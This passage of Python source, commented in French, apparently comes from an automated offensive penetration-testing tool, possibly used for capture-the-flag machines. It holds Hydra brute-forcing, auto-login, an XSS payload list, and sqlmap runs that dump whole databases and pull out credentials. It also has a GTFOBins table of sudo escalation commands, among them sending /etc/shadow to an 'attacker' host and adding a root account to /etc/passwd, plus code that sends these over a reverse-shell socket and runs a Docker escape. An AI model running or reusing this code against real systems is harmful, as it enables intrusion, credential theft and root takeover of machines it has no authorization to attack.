            action_id="ssh_userenum",
            title=f"Exploitation SSH — CVE-2018-15473 (OpenSSH {ssh_ver})",
            details=(
                f"Enumération de comptes valides sur {cfg.target}:{ssh_port} "
                "via la vulnérabilité CVE-2018-15473 (timing attack). "
                "Technique passive, sans création de compte ni modification."
            ),
        ):
            info(f"Exploitation — SSH CVE-2018-15473 (OpenSSH {ssh_ver})")
            f = run_ssh_vuln_detect(cfg, services, logs_dir)
            if f:
                exploit_findings.append(f)
        else:
            info("Exploitation SSH énumération → ignorée par l'utilisateur")

    # ── Hydra brute force (opt-in) ──────────────────────────────────────────
    if cfg.exploit_brute:
        if _webui_confirm(
            cfg,
            action_id="hydra_brute",
            title="Brute Force Hydra — attaque par dictionnaire",
            details=(
                f"Lancer Hydra sur {cfg.target} pour tenter de deviner des mots de passe "
                "sur les services détectés (SSH, FTP, SMB…). "
                "Génère un volume important de connexions — peut déclencher des alertes."
            ),
        ):
            info("Exploitation — Brute force Hydra (--exploit-brute)")
            f = run_hydra_brute(
                cfg, services, logs_dir,
                userlist=cfg.brute_userlist,
                passlist=cfg.brute_passlist,
            )
            if f:
                exploit_findings.append(f)
        else:
            info("Brute force Hydra → ignoré par l'utilisateur")

    return exploit_findings


# ════════════════════════════════════════════════════════════════════════════
# MODULE WEB CRAWL — Extraction de formulaires et paramètres URL
# ════════════════════════════════════════════════════════════════════════════

def run_web_crawl(cfg: "Config", urls: List[str], logs_dir: Path) -> dict:
    """
    Crawl léger des pages web pour extraire :
    - Formulaires HTML (action, méthode, champs)
    - Paramètres GET/POST
    - Liens internes et endpoints

    Résultat utilisé par sqlmap et la détection XSS.
    Générique : fonctionne sur n'importe quelle application web.
    """
    if not urls:
        return {"forms": [], "params": [], "endpoints": []}

    try:
        import urllib.request as _req
        import urllib.parse as _parse
        import html.parser as _hp
        import re as _re
    except ImportError:
        return {"forms": [], "params": [], "endpoints": []}

    class _LinkFormParser(_hp.HTMLParser):
        def __init__(self, base_url: str):
            super().__init__()
            self.base = base_url
            self.forms: List[dict] = []
            self.links: List[str] = []
            self._cur_form: Optional[dict] = None

        def handle_starttag(self, tag, attrs):
            a = dict(attrs)
            if tag == "form":
                self._cur_form = {
                    "action": a.get("action", ""),
                    "method": a.get("method", "get").lower(),
                    "inputs": [],
                }
            elif tag == "input" and self._cur_form is not None:
                self._cur_form["inputs"].append({
                    "name": a.get("name", ""),
                    "type": a.get("type", "text"),
                    "value": a.get("value", ""),
                })
            elif tag == "a":
                href = a.get("href", "")
                if href and not href.startswith("#") and not href.startswith("javascript"):
                    self.links.append(href)

        def handle_endtag(self, tag):
            if tag == "form" and self._cur_form is not None:
                self.forms.append(self._cur_form)
                self._cur_form = None

    out_file = logs_dir / "web_crawl.txt"
    results = {"forms": [], "params": [], "endpoints": []}
    lines = [f"# Web Crawl — {cfg.target}\n# {now_iso()}\n\n"]

    visited: set = set()
    MAX_PAGES = 20  # Limiter le crawl à 20 pages max

    # Pages prioritaires pour trouver des formulaires (ordre de priorité)
    FORM_PRIORITY_PATHS = [
        "/login", "/signin", "/signup", "/register",
        "/new", "/new-listing", "/add", "/create",
        "/contact", "/upload", "/admin", "/messages",
        "/post", "/submit", "/edit", "/profile",
    ]

    # Construire la queue initiale : URLs de départ + chemins prioritaires
    base_url = urls[0].rstrip("/") if urls else f"http://{cfg.target}"
    base_domain = _parse.urlparse(base_url).netloc

    queue = list(urls[:2])
    # Ajouter les chemins prioritaires en tête de queue
    for path in FORM_PRIORITY_PATHS:
        candidate = base_url + path
        if candidate not in queue:
            queue.append(candidate)

    info(f"Web crawl — exploration de {len(queue)} pages cibles (max {MAX_PAGES})")

    for start_url in queue:
        if len(visited) >= MAX_PAGES:
            break
        if start_url in visited:
            continue
        visited.add(start_url)

        try:
            crawl_timeout = max(20, int(getattr(cfg, "probe_timeout", 4.0) * 5))
            r = _req.urlopen(start_url, timeout=crawl_timeout)
            final_url = r.geturl() or start_url
            body = r.read(1024 * 256).decode("utf-8", errors="replace")
            if final_url != start_url:
                lines.append(f"  [redirect] {start_url} → {final_url}\n")
                start_url = final_url
        except Exception as e:
            # Ignorer les 404 silencieusement (paths prioritaires qui n'existent pas)
            if "404" not in str(e) and "Not Found" not in str(e):
                lines.append(f"[!] {start_url} : {e}\n")
            continue

        parser = _LinkFormParser(start_url)
        try:
            parser.feed(body)
        except Exception as _exc:
            warn(f"[run_web_crawl] {_exc}")

        lines.append(f"## {start_url}\n")

        # Extraire paramètres URL
        parsed = _parse.urlparse(start_url)
        if parsed.query:
            params = _parse.parse_qs(parsed.query)
            for k in params:
                if k not in results["params"]:
                    results["params"].append(k)
                    lines.append(f"  [param] {start_url} → ?{k}=\n")

        # Formulaires
        for form in parser.forms:
            action = form["action"]
            if action and not action.startswith("http"):
                action = _parse.urljoin(start_url, action)
            form_entry = {
                "url": start_url,
                "action": action or start_url,
                "method": form["method"],
                "inputs": form["inputs"],
            }
            if form_entry not in results["forms"]:
                results["forms"].append(form_entry)
                field_names = [i["name"] for i in form["inputs"] if i["name"]]
                lines.append(f"  [form] {form['method'].upper()} {action or start_url} → champs: {', '.join(field_names)}\n")

        # Suivre tous les liens internes (pas seulement ceux avec paramètres)
        for link in parser.links[:50]:
            abs_link = _parse.urljoin(start_url, link)
            link_domain = _parse.urlparse(abs_link).netloc
            if link_domain != base_domain:
                continue
            if abs_link in visited:
                continue
            if abs_link not in results["endpoints"]:
                results["endpoints"].append(abs_link)
            # Ajouter à la queue : pages avec formulaires potentiels en priorité
            link_path = _parse.urlparse(abs_link).path.lower()
            has_params = "?" in abs_link
            is_form_page = any(fp in link_path for fp in ["/new", "/add", "/edit", "/submit", "/post", "/upload"])
            if has_params or is_form_page:
                lines.append(f"  [link→crawl] {abs_link}\n")
                queue.append(abs_link)
            elif len(visited) < MAX_PAGES // 2:
                # Crawler aussi les pages normales si on a encore de la marge
                queue.append(abs_link)

    ok(f"[+] Web crawl : {len(results['forms'])} formulaire(s), {len(results['params'])} param(s), {len(results['endpoints'])} endpoint(s) ({len(visited)} pages visitées)")
    out_file.write_text("".join(lines), encoding="utf-8", errors="replace")

    return results


# ════════════════════════════════════════════════════════════════════════════
# MODULE WEB AUTH — Login automatique et session partagée
# ════════════════════════════════════════════════════════════════════════════

def run_web_auth(cfg: "Config", urls: List[str], logs_dir: Path):
    """
    Tente un login automatique sur l'application web avec les credentials fournis.
    Retourne un objet requests.Session authentifié + le cookie de session.

    Générique : cherche la page de login, soumet les credentials,
    vérifie la redirection/réponse pour confirmer l'authentification.
    Fonctionne sur la majorité des apps web (Django, Express, Laravel, PHP, etc.)
    """
    if not cfg.web_auth:
        return None, None

    try:
        import requests as _req
        from requests.packages.urllib3.exceptions import InsecureRequestWarning
        _req.packages.urllib3.disable_warnings(InsecureRequestWarning)
    except ImportError:
        warn("web-auth: requests non disponible → SKIP")
        return None, None

    cred_parts = cfg.web_auth.split(":", 1)
    if len(cred_parts) != 2:
        warn("web-auth: format invalide, utiliser user:password")
        return None, None

    username, password = cred_parts
    out_file = logs_dir / "web_auth.txt"
    lines = [f"# Web Auth — {cfg.target}\n# {now_iso()}\n# User: {username}\n\n"]

    session = _req.Session()
    session.verify = False
    session.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) PentoolBot/1.0"})

    # ── 1. Trouver la page de login ───────────────────────────────────────────
    base_url = urls[0] if urls else f"http://{cfg.target}"
    login_url = cfg.web_auth_url

    if not login_url:
        # Chemins de login courants (ordre de priorité)
        login_candidates = [
            "/login", "/signin", "/auth/login", "/user/login",
            "/account/login", "/auth", "/wp-login.php", "/admin/login",
            "/panel", "/dashboard", "/portal", "/access",
        ]
        for path in login_candidates:
            candidate = base_url.rstrip("/") + path
            try:
                r = session.get(candidate, timeout=10, allow_redirects=True)
                # Page de login = contient un formulaire avec champs password
                if r.status_code == 200 and (
                    'type="password"' in r.text or
                    "type='password'" in r.text or
                    "mot de passe" in r.text.lower() or
                    "password" in r.text.lower()
                ):
                    login_url = candidate
                    lines.append(f"[+] Page de login trouvée: {login_url}\n")
                    info(f"[+] Web auth : page login détectée → {login_url}")
                    break
            except Exception:
                continue

    if not login_url:
        warn("web-auth: page de login introuvable")
        lines.append("[-] Aucune page de login trouvée\n")
        out_file.write_text("".join(lines), encoding="utf-8")
        return None, None

    # ── 2. Analyser le formulaire de login ────────────────────────────────────
    try:
        r = session.get(login_url, timeout=10)
        page_html = r.text
    except Exception as e:
        warn(f"web-auth: erreur lecture page login: {e}")
        return None, None

    # Extraire les champs du formulaire (action, CSRF token, noms des champs)
    import re as _re
    import html.parser as _hp
    import urllib.parse as _parse

    class _FormParser(_hp.HTMLParser):
        def __init__(self):
            super().__init__()
            self.forms = []
            self._cur = None
        def handle_starttag(self, tag, attrs):
            a = dict(attrs)
            if tag == "form":
                self._cur = {"action": a.get("action",""), "method": a.get("method","post").lower(), "inputs": {}}
            elif tag == "input" and self._cur is not None:
                name = a.get("name","")
                typ = a.get("type","text").lower()
                val = a.get("value","")
                if name:
                    self._cur["inputs"][name] = {"type": typ, "value": val}
        def handle_endtag(self, tag):
            if tag == "form" and self._cur:
                self.forms.append(self._cur)
                self._cur = None

    fp = _FormParser()
    fp.feed(page_html)

    # Trouver le formulaire qui contient un champ password
    login_form = None
    for form in fp.forms:
        if any(v["type"] == "password" for v in form["inputs"].values()):
            login_form = form
            break

    if not login_form:
        warn("web-auth: formulaire de login non trouvé dans la page")
        lines.append("[-] Formulaire avec champ password non trouvé\n")
        out_file.write_text("".join(lines), encoding="utf-8")
        return None, None

    # ── 3. Construire et soumettre le formulaire ──────────────────────────────
    form_data = {}
    user_field = None
    pass_field = None

    for field_name, field_info in login_form["inputs"].items():
        ftype = field_info["type"]
        # Champ username : type text/email ou nom contenant user/login/email
        if ftype in ("text", "email") or any(k in field_name.lower() for k in ("user", "login", "email", "name")):
            if user_field is None:
                user_field = field_name
                form_data[field_name] = username
        # Champ password
        elif ftype == "password":
            pass_field = field_name
            form_data[field_name] = password
        # Autres champs (CSRF token, hidden fields) → garder la valeur par défaut
        elif ftype == "hidden" or field_info["value"]:
            form_data[field_name] = field_info["value"]

    if not user_field or not pass_field:
        warn(f"web-auth: champs user/pass non détectés automatiquement (form fields: {list(login_form['inputs'].keys())})")
        # Fallback : prendre les deux premiers champs text/password
        fields = list(login_form["inputs"].items())
        if len(fields) >= 2:
            form_data[fields[0][0]] = username
            form_data[fields[1][0]] = password

    # URL d'action du formulaire
    action = login_form.get("action", "")
    if not action:
        post_url = login_url
    elif action.startswith("http"):
        post_url = action
    else:
        post_url = _parse.urljoin(login_url, action)

    lines.append(f"[*] POST → {post_url}\n")
    lines.append(f"[*] Champs: {list(form_data.keys())}\n")

    try:
        resp = session.post(post_url, data=form_data, timeout=10, allow_redirects=True)
        lines.append(f"[*] Réponse: {resp.status_code} (URL finale: {resp.url})\n")
    except Exception as e:
        warn(f"web-auth: erreur POST login: {e}")
        lines.append(f"[!] Erreur POST: {e}\n")
        out_file.write_text("".join(lines), encoding="utf-8")
        return None, None

    # ── 4. Vérifier le succès du login ────────────────────────────────────────
    cookies = dict(session.cookies)
    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

    # Indicateurs d'échec de login
    fail_indicators = ["invalid", "incorrect", "wrong", "failed", "error",
                       "bad credential", "mot de passe incorrect", "identifiant"]
    success_indicators = ["logout", "dashboard", "profile", "account",
                          "welcome", "bienvenue", "déconnexion", "sign out"]

    resp_lower = resp.text.lower()
    failed = any(ind in resp_lower for ind in fail_indicators)
    success = any(ind in resp_lower for ind in success_indicators) or (
        resp.url != login_url and resp.status_code == 200
    )

    if failed and not success:
        warn(f"web-auth: login échoué pour {username} (credentials incorrects ?)")
        lines.append(f"[-] Login ÉCHOUÉ — credentials incorrects ?\n")
        out_file.write_text("".join(lines), encoding="utf-8")
        return None, None

    ok(f"[+] Web auth : connecté en tant que {username} → {resp.url}")
    lines.append(f"[+] LOGIN RÉUSSI → {resp.url}\n")
    lines.append(f"[+] Cookie de session: {cookie_str}\n")

    out_file.write_text("".join(lines), encoding="utf-8")
    return session, cookie_str


# ════════════════════════════════════════════════════════════════════════════
# MODULE XSS — Détection d'injections Cross-Site Scripting
# ════════════════════════════════════════════════════════════════════════════

# Payloads XSS classés par catégorie
XSS_PAYLOADS = [
    # Réflexion basique (détection)
    '<script>alert("PENTOOL_XSS")</script>',
    '"><script>alert("PENTOOL_XSS")</script>',
    "'><script>alert('PENTOOL_XSS')</script>",
    # Balises alternatives (contournement de filtres)
    '<img src=x onerror=alert("PENTOOL_XSS")>',
    '<svg onload=alert("PENTOOL_XSS")>',
    '<body onload=alert("PENTOOL_XSS")>',
    # Attributs événements
    '" onmouseover="alert(\'PENTOOL_XSS\')" "',
    # Encodage
    '&#60;script&#62;alert("PENTOOL_XSS")&#60;/script&#62;',
    # Polyglot (fonctionne dans plusieurs contextes)
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//',
]

XSS_MARKER = "PENTOOL_XSS"


def run_xss_scan(cfg: "Config", urls: List[str], crawl_data: dict,
                 logs_dir: Path, session=None) -> Optional[dict]:
    """
    Détecte les vulnérabilités XSS (Cross-Site Scripting) sur :
    - Paramètres GET dans les URLs
    - Champs de formulaires HTML (POST et GET)

    Générique : fonctionne sur n'importe quelle application web.
    Utilise dalfox si disponible, sinon Python natif.
    """
    if not cfg.run_xss:
        return None

    try:
        import requests as _req
        from requests.packages.urllib3.exceptions import InsecureRequestWarning
        _req.packages.urllib3.disable_warnings(InsecureRequestWarning)
    except ImportError:
        warn("xss: requests non disponible → SKIP")
        return None

    out_file = logs_dir / "xss_scan.txt"
    xss_findings = []
    lines = [f"# XSS Scan — {cfg.target}\n# {now_iso()}\n\n"]

    import urllib.parse as _parse

    # Session à utiliser (authentifiée ou anonyme)
    req_session = session or _req.Session()
    req_session.verify = False
    if not session:
        req_session.headers.update({"User-Agent": "Mozilla/5.0 PentoolXSS/1.0"})

    headers_xss = {"User-Agent": "Mozilla/5.0 PentoolXSS/1.0"}

    def _test_reflected(url: str, params: dict, method: str = "GET") -> Optional[dict]:
        """Teste un payload XSS et vérifie s'il est réfléchi dans la réponse."""
        for payload in XSS_PAYLOADS[:5]:  # 5 payloads suffiront pour la détection
            test_params = dict(params)
            # Injecter le payload dans chaque paramètre un par un
            for param_name in list(test_params.keys()):
                original_val = test_params[param_name]
                test_params[param_name] = payload
                try:
                    if method.upper() == "POST":
                        r = req_session.post(url, data=test_params, timeout=10,
                                             allow_redirects=True, verify=False)
                    else:
                        r = req_session.get(url, params=test_params, timeout=10,
                                            allow_redirects=True, verify=False)

                    # Vérifier la réflexion directe du payload (XSS réfléchi)
                    if XSS_MARKER in r.text:
                        return {
                            "type": "Reflected XSS",
                            "url": url,
                            "param": param_name,
                            "payload": payload,
                            "method": method,
                            "status": r.status_code,
                        }

                    # Vérifier réflexion partielle (payload encodé ou filtré partiellement)
                    partial_markers = ["PENTOOL", "alert(", "onerror=", "onload=", "<script"]
                    if any(m.lower() in r.text.lower() for m in partial_markers):
                        return {
                            "type": "Possible XSS (partial reflection)",
                            "url": url,
                            "param": param_name,
                            "payload": payload,
                            "method": method,
                            "status": r.status_code,
                            "note": "payload partiellement réfléchi — vérifier manuellement",
                        }

                except Exception as e:
                    lines.append(f"  [error] {url} {param_name}: {e}\n")
                finally:
                    test_params[param_name] = original_val

        return None

    info("XSS scan — test des formulaires et paramètres URL")

    # ── 1. Paramètres GET dans les URLs ──────────────────────────────────────
    all_urls_to_test = list(urls) + crawl_data.get("endpoints", [])
    for target_url in all_urls_to_test:
        parsed = _parse.urlparse(target_url)
        if not parsed.query:
            continue
        params = dict(_parse.parse_qsl(parsed.query))
        if not params:
            continue

        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        lines.append(f"\n## GET params: {target_url}\n")

        result = _test_reflected(base, params, "GET")
        if result:
            xss_findings.append(result)
            ok(f"[+] XSS trouvée! [{result['type']}] {target_url} → param: {result['param']}")
            lines.append(f"[+] {result['type']} — param: {result['param']}\n"
                         f"    payload: {result['payload'][:80]}\n")

    # ── 2. Formulaires HTML (POST et GET) ─────────────────────────────────────
    for form in crawl_data.get("forms", []):
        form_url = form.get("action") or form.get("url", "")
        method = form.get("method", "get").upper()
        inputs = form.get("inputs", [])

        if not form_url or not inputs:
            continue

        # Construire les données du formulaire avec des valeurs par défaut
        form_params = {}
        injectable_fields = []
        for inp in inputs:
            name = inp.get("name", "")
            itype = inp.get("type", "text").lower()
            if not name:
                continue
            if itype in ("text", "search", "email", "url", "textarea", "number"):
                form_params[name] = inp.get("value") or "test"
                injectable_fields.append(name)
            elif itype not in ("submit", "button", "file", "image"):
                form_params[name] = inp.get("value", "")

        if not injectable_fields:
            continue

        lines.append(f"\n## {method} form: {form_url} (champs: {injectable_fields})\n")

        result = _test_reflected(form_url, form_params, method)
        if result:
            xss_findings.append(result)
            ok(f"[+] XSS trouvée! [{result['type']}] {form_url} → param: {result['param']} ({method})")
            lines.append(f"[+] {result['type']} — param: {result['param']}\n"
                         f"    payload: {result['payload'][:80]}\n")

    # ── 3. Si dalfox disponible, lancer aussi (plus puissant) ─────────────────
    if which("dalfox") and urls:
        dalfox_out = logs_dir / "dalfox_results.txt"
        dalfox_cmd = ["dalfox", "url", urls[0], "--silence", "--no-spinner",
                      "--output", str(dalfox_out)]
        if session:
            # Passer les cookies d'authentification
            cookie_header = "; ".join(f"{k}={v}" for k, v in session.cookies.items())
            if cookie_header:
                dalfox_cmd += ["--cookie", cookie_header]

        lines.append(f"\n## dalfox: {urls[0]}\n")
        run_cmd(dalfox_cmd, dalfox_out, timeout=60, label="dalfox", verbose=cfg.verbose)
        if dalfox_out.exists():
            dalfox_content = dalfox_out.read_text(encoding="utf-8", errors="replace")
            if "POC" in dalfox_content or "XSS" in dalfox_content.upper():
                lines.append(f"[+] dalfox a trouvé des XSS!\n{dalfox_content[:500]}\n")
                xss_findings.append({
                    "type": "XSS (dalfox)",
                    "url": urls[0],
                    "raw": dalfox_content[:200],
                })

    out_file.write_text("".join(lines), encoding="utf-8")

    if not xss_findings:
        ok("XSS scan : aucun XSS réfléchi détecté sur les cibles testées")
        return {
            "severity": "info",
            "title": f"XSS scan — aucune injection XSS détectée",
            "source": "xss_scan",
            "phase": "exploitation",
            "evidence_file": str(out_file),
        }

    sev = "high" if any(f["type"] == "Reflected XSS" for f in xss_findings) else "medium"
    return {
        "severity": sev,
        "title": f"XSS détectée — {len(xss_findings)} point(s) d'injection",
        "source": "xss_scan",
        "phase": "exploitation",
        "evidence_file": str(out_file),
        "xss_findings": xss_findings,
        "injectable_params": [f.get("param") for f in xss_findings],
    }


# ════════════════════════════════════════════════════════════════════════════
# MODULE SQLMAP — Détection et exploitation d'injections SQL
# ════════════════════════════════════════════════════════════════════════════

def run_sqlmap_scan(cfg: "Config", urls: List[str], crawl_data: dict, logs_dir: Path) -> Optional[dict]:
    """
    Lance sqlmap sur les URLs et formulaires découverts.
    Générique : teste automatiquement toute URL avec paramètres GET/POST.

    Stratégie :
    1. URLs avec paramètres GET (ex: /admin?user=1)
    2. Formulaires POST détectés par le crawl
    3. Niveau de risque modéré (évite de crasher l'app)
    """
    if not cfg.run_sqlmap:
        return None
    if not which("sqlmap"):
        warn("sqlmap non disponible — SKIP (pip install sqlmap ou apt install sqlmap)")
        return None

    targets_sqli: List[tuple] = []  # (url, method, data)

    # Endpoints avec paramètres GET
    all_endpoints = list(urls) + crawl_data.get("endpoints", [])
    for ep in all_endpoints:
        if "?" in ep and "=" in ep:
            targets_sqli.append((ep, "GET", None))

    # Formulaires POST
    for form in crawl_data.get("forms", []):
        action = form.get("action", "")
        method = form.get("method", "get").upper()
        if not action:
            continue
        if method == "POST":
            data = "&".join(
                f"{i['name']}={i.get('value','test')}"
                for i in form.get("inputs", [])
                if i.get("name") and i.get("type") not in ("submit", "button", "hidden")
            )
            if data:
                targets_sqli.append((action, "POST", data))
        else:
            # Formulaire GET → construire URL avec paramètres
            params = "&".join(
                f"{i['name']}=1"
                for i in form.get("inputs", [])
                if i.get("name") and i.get("type") not in ("submit", "button")
            )
            if params:
                url_with_params = f"{action}?{params}" if "?" not in action else f"{action}&{params}"
                targets_sqli.append((url_with_params, "GET", None))

    if not targets_sqli:
        warn("sqlmap : aucun paramètre/formulaire trouvé → SKIP")
        return None

    sqlmap_dir = logs_dir / "sqlmap"
    sqlmap_dir.mkdir(exist_ok=True)
    all_findings = []

    info(f"SQLmap — test de {len(targets_sqli)} cible(s) (SQLi automatique)")

    for i, (target_url, method, post_data) in enumerate(targets_sqli[:5]):  # Max 5 cibles
        out_file = sqlmap_dir / f"sqlmap_{i}.txt"
        cmd = [
            "sqlmap",
            "-u", target_url,
            "--batch",            # Pas de prompts interactifs
            "--level", "2",       # Niveau de test (1-5), 2 = raisonnable
            "--risk", "1",        # Risque (1-3), 1 = sûr
            "--timeout", "15",
            "--retries", "1",
            "--threads", "3",
            "--output-dir", str(sqlmap_dir),
            "--no-cast",
            "--forms",            # Détecter aussi les formulaires dans la page
        ]
        if method == "POST" and post_data:
            cmd += ["--data", post_data]

        # Options d'extraction si SQLi trouvée
        cmd += [
            "--dbs",              # Lister les bases de données
            "--tables",           # Lister les tables
            "--dump-all",         # Dumper les données (limité par --level)
        ]

        label = f"sqlmap[{i}]"
        rc = run_cmd(cmd, out_file, timeout=180, label=label, verbose=cfg.verbose)

        # Parser le résultat
        if out_file.exists():
            content = out_file.read_text(encoding="utf-8", errors="replace")
            injectable_params = []
            db_found = []
            tables_found = []
            creds_found = []

            for line in content.splitlines():
                if "Parameter:" in line and ("injectable" in line.lower() or "is vulnerable" in line.lower()):
                    injectable_params.append(line.strip())
                if "[INFO] available databases" in line.lower() or "retrieved:" in line.lower():
                    db_found.append(line.strip())
                if "Database:" in line or "Table:" in line:
                    tables_found.append(line.strip())
                # Chercher credentials dans le dump
                if any(kw in line.lower() for kw in ["password", "passwd", "admin", "hash"]):
                    creds_found.append(line.strip())

            if injectable_params or db_found:
                ok(f"[+] SQLi trouvée sur {target_url} → params: {injectable_params[:2]}")
                all_findings.append({
                    "url": target_url,
                    "injectable_params": injectable_params,
                    "databases": db_found[:5],
                    "tables": tables_found[:10],
                    "creds": creds_found[:5],
                    "log": str(out_file),
                })

    if not all_findings:
        return {
            "severity": "info",
            "title": f"SQLmap — aucune injection SQL trouvée ({len(targets_sqli)} cible(s) testée(s))",
            "source": "sqlmap",
            "phase": "exploitation",
            "evidence_file": str(sqlmap_dir),
        }

    sev = "critical" if any(f.get("creds") for f in all_findings) else "high"
    creds_all = [c for f in all_findings for c in f.get("creds", [])]

    return {
        "severity": sev,
        "title": f"SQLi confirmée — {len(all_findings)} point(s) d'injection SQL",
        "source": "sqlmap",
        "phase": "exploitation",
        "evidence_file": str(sqlmap_dir),
        "sqli_findings": all_findings,
        "found_creds": creds_all[:10],
        "injectable_urls": [f["url"] for f in all_findings],
    }


# ════════════════════════════════════════════════════════════════════════════
# MODULE PRIVESC AVANCÉE — Docker, LXD, Sudo, Writable scripts
# Appelé depuis _run_postexploit_via_socket après la recon interne
# ════════════════════════════════════════════════════════════════════════════

# GTFOBins pour sudo (commandes permettant d'escalader via sudo NOPASSWD)
GTFOBINS_SUDO: Dict[str, str] = {
    "env":      "sudo env /bin/sh",
    "bash":     "sudo bash",
    "sh":       "sudo sh",
    "python":   "sudo python -c 'import os; os.system(\"/bin/sh\")'",
    "python3":  "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
    "perl":     "sudo perl -e 'exec \"/bin/sh\"'",
    "ruby":     "sudo ruby -e 'exec \"/bin/sh\"'",
    "vim":      "sudo vim -c ':!/bin/sh'",
    "vi":       "sudo vi -c ':!/bin/sh'",
    "less":     "sudo less /etc/passwd → !/bin/sh",
    "more":     "sudo more /etc/passwd → !/bin/sh",
    "man":      "sudo man man → !/bin/sh",
    "nano":     "sudo nano → CTRL+R CTRL+X → reset; sh 1>&0 2>&0",
    "nmap":     "sudo nmap --interactive → !sh",
    "find":     "sudo find . -exec /bin/sh \\; -quit",
    "awk":      "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
    "wget":     "sudo wget --post-file=/etc/shadow http://attacker/",
    "curl":     "sudo curl file:///etc/shadow",
    "tar":      "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "zip":      "sudo zip /tmp/test.zip /tmp/test -T --unzip-command='sh -c /bin/sh'",
    "node":     "sudo node -e 'child_process.spawn(\"/bin/sh\",[\"-p\"],{stdio:[0,1,2]})'",
    "php":      "sudo php -r 'system(\"/bin/sh\");'",
    "tee":      "echo 'root2::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd",
    "cp":       "sudo cp /bin/bash /tmp/rootbash; sudo chmod +s /tmp/rootbash; /tmp/rootbash -p",
    "dd":       "sudo dd if=/etc/shadow",
    "base64":   "sudo base64 /etc/shadow | base64 -d",
    "cat":      "sudo cat /etc/shadow",
    "xxd":      "sudo xxd /etc/shadow | xxd -r",
    "pkexec":   "sudo pkexec /bin/sh",
}


def _parse_sudo_entries(sudo_output: str) -> List[dict]:
    """
    Parse la sortie de 'sudo -l' et retourne les entrées NOPASSWD exploitables.
    Exemple : (root) NOPASSWD: /usr/bin/python3
    """
    entries = []
    for line in sudo_output.splitlines():
        line = line.strip()
        if "NOPASSWD" not in line:
            continue
        # Extraire les commandes
        import re as _re
        # Ex: (root) NOPASSWD: /usr/bin/python3, /usr/bin/bash
        cmd_part = _re.sub(r"^\(.*?\)\s*NOPASSWD:\s*", "", line)
        cmds = [c.strip() for c in cmd_part.split(",")]
        for cmd in cmds:
            if not cmd:
                continue
            binary = Path(cmd.split()[0]).name if cmd != "ALL" else "ALL"
            exploit = GTFOBINS_SUDO.get(binary) or (f"sudo {cmd}" if cmd == "ALL" else None)
            entries.append({
                "cmd": cmd,
                "binary": binary,
                "exploit": exploit,
                "line": line,
            })
    return entries


def _run_advanced_privesc(conn, logs_dir: Path, id_result: str, sudo_result: str, suid_result: str) -> dict:
    """
    Tente des vecteurs d'escalade avancés après recon initiale :
    - Sudo NOPASSWD via GTFOBins
    - Docker group escape
    - LXD group escape
    - Writable scripts dans cron

    Retourne un dict avec les résultats.
    """
    import socket as _sock
    import time as _time

    results = {}
    raw = ["## Privesc avancée\n\n"]

    def _send(cmd, wait=3.0):
        try:
            conn.send((cmd + "\n").encode())
            _time.sleep(wait)
            out = b""
            conn.settimeout(wait)
            while True:
                try:
                    chunk = conn.recv(4096)
                    if not chunk: break
                    out += chunk
                    if len(chunk) < 4096: break
                except _sock.timeout:
                    break
            return strip_ansi(out.decode("utf-8", errors="replace"))
        except Exception as e:
            return f"[error: {e}]"

    privesc_dir = logs_dir / "post_exploit"
    privesc_dir.mkdir(exist_ok=True)

    # ── 1. Sudo NOPASSWD → GTFOBins ─────────────────────────────────────────
    if sudo_result and "NOPASSWD" in sudo_result:
        raw.append("### Sudo NOPASSWD détecté\n")
        entries = _parse_sudo_entries(sudo_result)
        for entry in entries:
            exploit = entry.get("exploit")
            if not exploit or "→" in exploit:  # Commandes interactives — skip auto
                raw.append(f"  [manual] {entry['cmd']} → {exploit}\n")
                continue

            raw.append(f"\n#### Tentative sudo : {entry['binary']}\n$ {exploit}\n")
            _send(exploit, wait=2.0)
            check = _send("id", wait=2.0)
            raw.append(check + "\n")

            if "uid=0" in check or "euid=0" in check:
                ok(f"[+] ROOT via sudo {entry['binary']}!")
                raw.append("[+] ESCALADE SUDO RÉUSSIE — root!\n")
                results["privesc_method"] = f"sudo NOPASSWD {entry['binary']}"
                results["privesc_id"] = check.strip()
                (privesc_dir / "privesc_method.txt").write_text(results["privesc_method"], encoding="utf-8")
                (privesc_dir / "privesc_id.txt").write_text(results["privesc_id"], encoding="utf-8")
                break

    # ── 2. Docker group escape ────────────────────────────────────────────────
    if "docker" in id_result.lower() and "privesc_method" not in results:
        raw.append("### Docker group détecté — tentative d'escalade\n")

        # Lister les images disponibles
        images_out = _send("docker image ls --format '{{.Repository}}:{{.Tag}}' 2>/dev/null", wait=5.0)
        raw.append(f"Images docker disponibles:\n{images_out}\n")
        (privesc_dir / "docker_images.txt").write_text(images_out, encoding="utf-8")

        # Chercher une image alpine ou ubuntu ou la première disponible
        image = None
        for line in images_out.splitlines():
            line = line.strip()
            if not line or line.startswith("REPOSITORY"):
                continue
            for pref in ("alpine", "ubuntu", "debian", "bash", "busybox"):
                if pref in line.lower():
                    image = line.split()[0] if " " in line else line
                    break
            if image:
                break
        if not image:
            # Prendre la première image listée
            for line in images_out.splitlines():
                line = line.strip()
                if line and not line.startswith("REPOSITORY") and ":" in line:
                    image = line
                    break

        if image:
            info(f"[*] Docker escape via image: {image}")
            escape_cmd = f"docker run -v /:/mnt --rm -it {image} chroot /mnt sh"
            raw.append(f"\n#### Docker escape\n$ {escape_cmd}\n")
            _send(escape_cmd, wait=4.0)
            check = _send("id", wait=3.0)
            raw.append(check + "\n")

            if "uid=0" in check or "root" in check.lower():
                ok(f"[+] ROOT via Docker group escape!")
                raw.append("[+] DOCKER ESCAPE RÉUSSI — root!\n")

                # Lire les flags depuis le système monté
                flag_check = _send("cat /mnt/root/root.txt 2>/dev/null || cat /root/root.txt 2>/dev/null", wait=3.0)
                if flag_check.strip():
                    ok(f"[+] Flag root: {flag_check.strip()[:80]}")
                    raw.append(f"Flag root: {flag_check}\n")
                    results["root_flag"] = flag_check.strip()

                results["privesc_method"] = f"Docker group escape ({image})"
                results["privesc_id"] = check.strip()
